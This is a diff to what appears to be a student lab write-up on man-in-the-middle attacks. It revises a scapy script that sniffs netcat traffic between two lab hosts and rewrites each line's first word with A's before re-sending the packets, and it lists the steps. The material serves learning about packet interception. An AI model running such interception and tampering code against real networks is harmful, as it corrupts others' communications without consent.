@@ -200,9 +200,7 @@ This time we are changing netcat connections instead of ```telnet``` to allow ``
 
 ```
 #!/usr/bin/env python3
-import subprocess
 from scapy.all import *
-print("Nigel is intercepting netcat of Nige")
 
 IP_A = "10.9.0.5"
 MAC_A = "02:42:0a:09:00:05"
@@ -220,13 +218,23 @@ def spoof_pkt(pkt):
         del(newpkt.chksum)
         del(newpkt[TCP].payload)
         del(newpkt[TCP].chksum)
-
+        
         # Construct the new payload based on the old payload.
         if pkt[TCP].payload:
-            old_data = str(pkt[TCP].payload.decode())
-            new_data = old_data.replace("Nige", "A" * len("Nige"))
-            new_data = new_data.encode()
-            send(newpkt/new_data)
+            data = pkt[TCP].payload.load.decode()  # Decode bytes to string
+            lines = data.split("\n")  # Split payload into lines
+            new_lines = []
+            for line in lines:
+                words = line.split()
+                if words:
+                    first_word = words[0]
+                    new_word = "A" * len(first_word)  # Replace with A's of same length
+                    new_line = line.replace(first_word, new_word, 1)  # Replace only the first occurrence
+                    new_lines.append(new_line)
+                else:
+                    new_lines.append(line)
+            newdata = "\n".join(new_lines).encode()  # Re-encode lines to bytes
+            send(newpkt/newdata)
         else:
             send(newpkt)
     elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
@@ -237,18 +245,21 @@ def spoof_pkt(pkt):
         del(newpkt[TCP].chksum)
         send(newpkt)
 
-# Start netcat listener on Host B
-subprocess.Popen(["nc", "-l", "-p", "1234"])
-
-# Send netcat message from Host A to Host B
-subprocess.Popen(["echo", "Hello, world! This is Nige speaking.", "|", "nc", "10.9.0.6", "1234"])
-
-# Start sniffing packets on Host M
-f = 'tcp'
-pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+iface = "eth0"
+filter_str = "tcp and src host {} and dst host {}".format(IP_A, IP_B)
+pkt = sniff(iface=iface, filter=filter_str, prn=spoof_pkt)
 ```
 
-In this modified script, the ```subprocess``` module is used to start a netcat listener on Host B and send a netcat message from Host A to Host B. The ```spoof_pkt``` function is similar to the original script, but it modifies the payload of the packets using the replace method to replace "Nige" with a sequence of A's of the same length. The modified payload is then sent in a new packet using the ```send``` method.
+Here's what I'm aiming to do with the above modifications for ```netcat```: <br/>
+<br/>
+1. Decode the TCP payload from bytes to string.
+2. Split the payload into lines.
+3. Iterate over the lines and for each line:
+4. Split the line into words.
+5. If there are words, get the first word and replace it with a sequence of A's of the same length.
+6. Append the modified line to a new list of lines.
+7. Join the new list of lines into a single string with newline characters.
+8. Encode the new string back to bytes and use it as the payload of the new packet.
 
 ### Second Attempt
 ```
